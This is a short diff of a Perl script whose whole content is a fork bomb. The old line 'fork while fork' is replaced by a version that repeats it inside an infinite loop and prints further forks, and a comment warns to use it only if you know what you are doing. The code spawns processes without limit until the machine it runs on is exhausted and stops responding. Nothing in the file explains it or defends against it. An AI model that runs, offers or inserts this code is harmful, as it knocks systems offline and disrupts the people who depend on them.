@@ -1,3 +1,6 @@
 #! /usr/bin/perl
-#Careful about this, use only if you know what you are doing 
-fork while fork  
+# Careful about this, use only if you know what you are doing 
+while(1) {
+fork while fork;
+print fork(); 
+} 
